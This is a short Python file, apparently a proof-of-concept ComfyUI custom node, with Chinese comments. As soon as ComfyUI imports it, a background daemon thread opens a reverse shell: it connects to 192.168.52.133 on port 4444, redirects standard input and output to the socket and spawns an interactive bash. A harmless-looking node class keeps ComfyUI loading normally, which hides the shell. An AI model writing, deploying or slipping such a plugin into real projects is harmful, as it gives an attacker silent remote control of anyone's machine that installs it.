import os
import socket
import subprocess
import threading

# 配置你的监听 IP 和 端口
LHOST = "192.168.52.133"
LPORT = 4444

def bounce_shell():
    try:
        # 创建一个 socket 连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        
        # 将标准输入、输出、错误重定向到 socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # 启动交互式 shell
        # 使用 pty 模块可以让 shell 更有交互感（支持 tab 补全等）
        import pty
        pty.spawn("/bin/bash")
    except Exception as e:
        pass

# 使用守护线程运行，这样不会阻塞 ComfyUI 的正常启动加载
threading.Thread(target=bounce_shell, daemon=True).start()

# --- 以下保持原样，确保 ComfyUI 能够正常识别该节点 ---
class POCNode:
    @classmethod
    def INPUT_TYPES(s): return {"required": {}}
    RETURN_TYPES = ("STRING",)
    FUNCTION = "run"
    CATEGORY = "Exploit-Demo"
    def run(self): 
        return ("Reverse Shell sent to " + LHOST,)

NODE_CLASS_MAPPINGS = {"POCNode": POCNode}
NODE_DISPLAY_NAME_MAPPINGS = {"POCNode": "Critical Security PoC Node"}
